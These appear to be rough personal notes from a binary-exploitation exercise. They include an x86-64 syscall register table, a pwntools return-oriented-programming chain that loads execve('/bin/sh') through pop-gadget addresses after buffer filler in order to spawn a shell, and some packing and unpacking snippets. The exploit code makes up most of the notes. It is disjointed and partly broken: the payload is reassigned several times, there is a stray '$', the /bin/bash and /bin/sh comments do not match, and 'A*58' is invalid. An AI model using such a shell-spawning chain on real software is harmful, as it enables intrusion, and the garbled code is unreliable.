+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %rcx | %r8  | %r9  |
+---------+------+------+------+------+------+------+
|   0x3b  | file |   0  |   0  | %rcx | %r8  | %r9  |
+---------+------+------+------+------+------+------+

0x00007ffdc0266de0

# POP_RDI : Before calling the "pop rdi; ret" gadget,  arrange the stack so that the address of "/bin/sh" is on top of it. This could be done by pushing the address onto the stack.
# When the "pop rdi; ret" gadget is executed, it pops the value from the stack into the RDI register. Since you've previously placed the address of "/bin/sh" on the stack, it will be loaded into RDI.


payload = SHELL_FILE = p64(0x68732f6e69622f)              # Set execve() filename: /bin/bash/


payload += BUFF_FILL            

#   MOV_RDI_RSI:    Pointer to 'mov rdi, rsi' gadget to copy '/bin/sh' from RSI to RDI for execve() file parameter
#

# if i enter at "enter small or large", it wil put in rdi itself
#  0x401f2f <run+64>         mov    rdi, rax




#
#   POP_RAX:        Pointer to 'pop rax; ret' gadget to load '59' (SYS_EXECVE) into RAX register for syscall
#   SYS_EXECVE:     Contains syscall number (59) for the sys_execve syscall (64-bit)
$
payload += POP_RAX              #POP_RAX = p64(0x0045a137)      ## Set Gadget 2: pop rax; ret
payload += SYS_EXECVE           #SYS_EXECVE = p64(59)           ## Set Sys Call 1: execve (59)    



payload += POP_RDI              #POP_RDI = p64(0x004018e2)              ## Set Gadget 1: pop rdi; ret
payload += SHELL_FILE           #SHELL_FILE = p64(0x68732f6e69622f)     ## Set execve() filename: /bin/bash/  

#
#   POP_RSI:        Pointer to 'pop rsi; ret' gadget to load '0' into RSI register for execve() argv
#   EXECVE_ARGV:    Null Value (0) for use as argv parameter in sys_execve()
#
payload += POP_RSI              #POP_RSI = p64(0x40f46e)        ## Set Gadget 3: pop rsi; ret
payload += EXECVE_ARGV          #EXECVE_ARGV = p64(0)		    ## Set execve() argv: null (0)

#
#   POP_RDX:        Pointer to 'pop rdx; ret' gadget to load '0' into RDX register for execve() envp
#   EXECVE_ENVP:    Null Value (0) for use as envp parameter in sys_execve()
#
payload += POP_RDX              #POP_RDX = p64(0x4017ef)        ## Set Gadget 4: pop rdx; ret 
payload += EXECVE_ENVP          #EXECVE_ENVP = p64(0)		    ## Set execve() envp: null (0)


#
#   SYS_CALL:       Pointer to 'syscall' to execute sys_execve()
#
payload += SYS_CALL             #SYS_CALL = p64(0x4012e3)       ## Set Sys Call address


''' Prepare Payload '''
#
# Payload Format:
#   BUFF_FILL:      Filler for Buffer
#
#   POP_RAX:        Pointer to a 'pop rax; ret' gadget to load RAX register with SYS_EXECVE (59)
#   SYS_EXECVE:     The syscall number (59) for the sys_execve syscall (64-bit).
#
#   POP_RDI:        Pointer to a 'pop rdi; ret' gadget to load RDI register with "/bin/sh"
#   EXECVE_FILE:    Pointer to the string '/bin/sh/' for use as file parameter in sys_execve()
#
#   POP_RSI:        Pointer to a 'pop rsi; ret' gadget to load RSI register with '0'
#   EXECVE_ARGV:    Null Value (0) for use as argv parameter in sys_execve()
#
#   POP_RDX:        Pointer to a 'pop rdx; ret' gadget to load RDX register with '0'
#   EXECVE_ENVP:    Null Value (0) for use as envp parameter in sys_execve()
#
#   SYS_CALL:       Pointer to 'syscall' to execute sys_execve()
#

payload = BUFF_FILL + \
          POP_RAX + \
          SYS_EXECVE + \
          POP_RDI + \
          EXECVE_FILE + \
          POP_RSI + \
          EXECVE_ARGV + \
          POP_RDX + \
          EXECVE_ENVP + \
          SYS_CALL




payload = A*58
payload += 0x68732f6e69622f

HHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPP

login+53


=============================


FROM BIN TO HEX

u = make_unpacker(64, endian='little', sign='unsigned')              # Create Unpacker
pack = b'\x0b\x00\x00\x00\x12\x00\x00\x00'
d = u(pack)
hex(d)
>> '0x140000000b'



FROM HEX TO BIN
from pwn import *

# Integer value you want to pack
value = 0x140000000b

# Use p64 to pack the integer value into a binary string
#b'\x0b\x00\x00\x00\x14\x00\x00\x00'

packed_value = p64(value)

# Convert the binary string to a hexadecimal representation
hex_representation = enhex(packed_value)

print(f' original value: {value}\npacked value: {packed_value}\nhex representation:0x{hex_representation}')





value = 0x0000000000000001
packed_value = p64(value)

0xfffffffffffffffc

b'\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00'




i = 11
SET_LENGTH = 20

pv = p64((SET_LENGTH << 32) | i)

b'\x0b\x00\x00\x00\x14\x00\x00\x00'

	for (i=0; i<SET_LENGTH; i++) {

		if (nums[i] > largest)
			largest = nums[i];

		if (nums[i] < smallest)
			smallest = nums[i];

	}
